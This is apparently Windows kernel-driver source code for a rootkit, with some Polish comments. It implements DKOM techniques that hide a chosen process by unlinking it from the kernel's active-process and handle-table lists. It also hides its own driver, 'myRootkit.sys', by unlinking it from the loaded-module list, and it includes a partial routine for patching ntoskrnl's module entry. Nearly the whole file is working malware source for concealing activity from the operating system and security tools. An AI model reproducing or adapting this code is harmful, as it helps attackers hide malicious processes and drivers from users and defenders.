
#include <ntddk.h>
#include "rootkit.h"
#include "rk_DKOM.h"
#include "rk_Tools.h"

extern ROOTKIT_SETUP_DATA offsets;
extern PMODULE_ENTRY	gul_PsLoadedModuleList;  

BOOLEAN OnProcessHide(IN ULONG pid) 
{
	PEPROCESS eproc = 0;
	KIRQL tmpIrql;

	DbgPrint("PID to hide: %d",pid);

	tmpIrql = RaiseIRQLevel();

	eproc = (PEPROCESS)FindProcessEPROCByPid( pid );

	DbgPrint( "EPROC: %x ",eproc);
	if (eproc == 0 ) {
		DbgPrint("Cant find process EPROC\n");	 
		return FALSE;
	}
	
	HideProcessFromProcessList( eproc );

	HideProcessFromHandleTable( eproc );

	//hehe we are not here ;)
//	ListProcessByHandleTable();

	//
//	ListProcessByCRSSTable();

	LowerIRQLevel( tmpIrql );

	return TRUE;
}


ULONG FindProcessEPROCByPid(int terminate_PID)
{
	ULONG eproc       = 0x00000000; 
	int   current_PID = 0;
	int   start_PID   = 0; 
	int   i_count     = 0;
	PLIST_ENTRY plist_active_procs;

	if (terminate_PID == 0)
		return terminate_PID;

	eproc = (ULONG) PsGetCurrentProcess();
	start_PID = *((ULONG*)(eproc+offsets.pidOffset));
	current_PID = start_PID;

	while(1)
	{
		if(terminate_PID == current_PID)
			return eproc;
		else if((i_count >= 1) && (start_PID == current_PID))
		{
			return 0x00000000;
		}
		else {
			plist_active_procs = (LIST_ENTRY *) (eproc+offsets.flinkOffset);
			eproc = (ULONG) plist_active_procs->Flink;
			eproc = eproc - offsets.flinkOffset;
			current_PID = *((int *)(eproc+offsets.pidOffset));
			i_count++;
		}
	}
}

ULONG FindProcessEPROCByName(char procName[])
{
	ULONG eproc       = 0x00000000; 
	int	i_count     = 0;
	char *startName = 0;
	char *currentName = 0;
	PLIST_ENTRY plist_active_procs;

	if (procName == 0)
		return 0;

	_asm int 3

	eproc = (ULONG)PsGetCurrentProcess();
	startName = (PCHAR)(eproc+offsets.nameOffset);
	currentName = startName;

	while(1)
	{

		if (!strncmp( procName, currentName, strlen(procName) ) ) 
			return eproc;
		else 
		if((i_count >= 1) && (startName == currentName))
		{
			return 0x00000000;
		}
		else {
			plist_active_procs = (LIST_ENTRY *) (eproc+offsets.flinkOffset);
			eproc = (ULONG) plist_active_procs->Flink;
			eproc = eproc - offsets.flinkOffset;
			currentName = (PCHAR)(eproc+offsets.nameOffset);
			i_count++;
		}
	}
}

VOID ListProcessByCRSSTable()
{
	PLIST_ENTRY pHandleList = NULL;
	PLIST_ENTRY startList = NULL;
	PULONG listpid;
	PEPROCESS eproc = (PEPROCESS)FindProcessEPROCByName("CSRSS.EXE");
    	
	DbgPrint("ListProcessByCRSSTable");

	if (eproc == 0x00000000) {
		eproc = (PEPROCESS)FindProcessEPROCByName("csrss.exe");
		if (eproc == 0x00000000) {
			DbgPrint("Nie moge znalezc EPROC z CSRSS.EXE");
			return;	
		}
	}

	DbgPrint("CSRSS.EXE eproc: %x",eproc);

	//get actual handle table list insite HANDLE_TABLE structure of CRSS.EXE
	startList = (PLIST_ENTRY)((*(PULONG)((ULONG) eproc + offsets.handleTableOffset )) + offsets.handleListOffset );
	pHandleList = startList;

	//do {
	//	DbgPrint("ListEntry %x",pHandleList);
	//	pHandleList = pHandleList->Flink;
	//} while (startList!=pHandleList);

}

VOID ListProcessByHandleTable()
{
	PLIST_ENTRY pHandleList = NULL;
	PLIST_ENTRY startList = NULL;
	PULONG listpid;
	PEPROCESS eproc = 0;

	eproc = PsGetCurrentProcess();

	pHandleList = (PLIST_ENTRY)((*(PULONG)((ULONG)eproc + offsets.handleTableOffset)) + offsets.listEntryOffset );

	startList = pHandleList;

	do 	{
		listpid = (PULONG)(( (ULONG)pHandleList + offsets.handleTablePidOffset) - offsets.listEntryOffset );

		DbgPrint("Process PID: %d",*listpid);

		pHandleList = pHandleList->Flink;	

	} while (startList != pHandleList );

	//PEPROCESS eproc;
	//PLIST_ENTRY start, table = NULL;
	//PULONG pid;

	//eproc = PsGetCurrentProcess();
	//table = (PLIST_ENTRY)((*(PULONG)((ULONG)eproc + offsets.handleTableOffset ))+offsets.listEntryOffset);

	//start = table;

	//do {
	//	pid = (PULONG)(((ULONG)table+offsets.handleTablePidOffset)-offsets.listEntryOffset);
	//	DbgPrint("List Pid: %d",*pid);

	//	table = table->Flink;
	//} while (start != table ); 
	//

}

//unlink from ActiveProcessLinks list
BOOLEAN HideProcessFromProcessList( PEPROCESS eproc )
{
	PLIST_ENTRY plist_active_procs;
	plist_active_procs = (PLIST_ENTRY)((ULONG)eproc + offsets.flinkOffset );

	*( (ULONG*)plist_active_procs->Blink )  = (ULONG)plist_active_procs->Flink;
	*( (ULONG*)plist_active_procs->Flink+1) = (ULONG)plist_active_procs->Blink;
	//poprawiamy zakonczenia pozostalego procesu
	plist_active_procs->Flink = (LIST_ENTRY*)&(plist_active_procs->Flink);
	plist_active_procs->Blink = (LIST_ENTRY*)&(plist_active_procs->Flink);
	return TRUE;
}

//unlinking from handles list
BOOLEAN HideProcessFromHandleTable( PEPROCESS eproc) 
{
	PLIST_ENTRY pHandleList = NULL;

	pHandleList = (PLIST_ENTRY)((*(PULONG)((ULONG)eproc + offsets.handleTableOffset)) + offsets.listEntryOffset );

	*((ULONG*)pHandleList->Blink) = (ULONG)pHandleList->Flink;
	*((ULONG*)pHandleList->Flink+1) = (ULONG)pHandleList->Blink;
	return TRUE;
}

BOOLEAN HideModule() 
{
	PMODULE_ENTRY pm_current;
	UNICODE_STRING driverToHide;
//	UNICODE_STRING notoskrnModuleStr;
	KIRQL	tmpIrql;
	BOOLEAN	ret = FALSE;

//	tmpIrql = RaiseIRQLevel();

	RtlInitUnicodeString( &driverToHide, L"myRootkit.sys" );
//	RtlInitUnicodeString( &notoskrnModuleStr, L"ntoskrnl.exe" );

	DbgPrint("DriverToHide: %S\n",driverToHide.Buffer);

	DbgPrint("gul_PsLoadedModuleList: %x\n",gul_PsLoadedModuleList);

	pm_current = gul_PsLoadedModuleList;//->le_mod.Flink;

	while ((PMODULE_ENTRY)pm_current->le_mod.Flink != gul_PsLoadedModuleList ) {
		if ( (pm_current->unk1 != 0x00000000) && (pm_current->driver_Path.Length!=0)) {
			//porownujemy nazwy driverow
			//DbgPrint( "DriverName: (%S), %x, %x,%x", pm_current->driver_Name.Buffer, pm_current->base,pm_current->driver_start,pm_current->unk1 );
			if (RtlCompareUnicodeString(&driverToHide, &(pm_current->driver_Name),FALSE ) ==0 ) {
				//zminieniamy sasiadow
				*((PULONG)pm_current->le_mod.Blink) = (ULONG)pm_current->le_mod.Flink;
				pm_current->le_mod.Flink->Blink = pm_current->le_mod.Blink;
				ret = TRUE;
				goto gt_leave;
			}
			//if (RtlCompareUnicodeString(&notoskrnModuleStr, &(pm_current->driver_Name),FALSE ) ==0 ) {
			//	DbgPrint("NTOSKRNL.EXE  found\n");
			//	;//DbgPrint("NTOSKRNL.EXE found, %x/%x",pm_current->driver_start,pm_current->base);
			//	goto gt_leave;
			//}

		}
		pm_current = (PMODULE_ENTRY)pm_current->le_mod.Flink;
	}

//	ret = FALSE;

gt_leave:
//	LowerIRQLevel( tmpIrql );

	return ret;
}

ULONG FindPsLoadedModuleList (IN PDRIVER_OBJECT  DriverObject)
{
	PMODULE_ENTRY pm_current;

	if (DriverObject == NULL)
		return 0;

	pm_current = *((PMODULE_ENTRY*)((ULONG)DriverObject + 0x14));
	if (pm_current == NULL)
		return 0;
	
	return (ULONG) pm_current;
}

PMODULE_ENTRY PatchNtoskrnlImageSize(PMODULE_ENTRY pPsLoadedModuleList)
{
	UNICODE_STRING us_Ntoskrl;
	UNICODE_STRING us_DriverToHide;
	PMODULE_ENTRY pMeNtoskrnl;
	PMODULE_ENTRY pMeDriverToHide;
	ULONG delta = 0;

	RtlInitUnicodeString( &us_Ntoskrl, L"ntoskrnl.exe" );
	RtlInitUnicodeString( &us_DriverToHide, L"myRootkit.sys" );

	pMeDriverToHide = FindModuleEntry( pPsLoadedModuleList, &us_DriverToHide );
	if (pMeDriverToHide != NULL) {
		pMeNtoskrnl = FindModuleEntry( pPsLoadedModuleList, &us_Ntoskrl );
		if (pMeNtoskrnl != NULL) {
			DbgPrint("pMeNtoskrnl imagesize: %ld\n",pMeNtoskrnl->unk1);	
			__asm int 3
//			pMeNtoskrnl->unk1 = (pMeDriverToHide->base-pMeNtoskrnl->base) + pMeDriverToHide->unk1; 
			DbgPrint("pMeNtoskrnl found %x\n",pMeNtoskrnl);	
			DbgPrint("pMeNtoskrnl imagesize: %ld\n",pMeNtoskrnl->unk1);	
			return pMeDriverToHide;
		}
	}
	return 0;
}

PMODULE_ENTRY FindModuleEntry(PMODULE_ENTRY pPsLoadedModuleList, PUNICODE_STRING usModuleName)
{
	PMODULE_ENTRY pMeCurrent = pPsLoadedModuleList;

	while ( (PMODULE_ENTRY)(pMeCurrent->le_mod.Flink) != pPsLoadedModuleList) {
		if ( (pMeCurrent->unk1 !=0x00000000) && pMeCurrent->driver_Path.Length!= 0) {
			if (RtlCompareUnicodeString(usModuleName, &(pMeCurrent->driver_Name),FALSE)== 0) {
				//znaleziono modul
				return pMeCurrent;
			}
		}
		pMeCurrent = (PMODULE_ENTRY)pMeCurrent->le_mod.Flink;
	}

	return NULL;
}
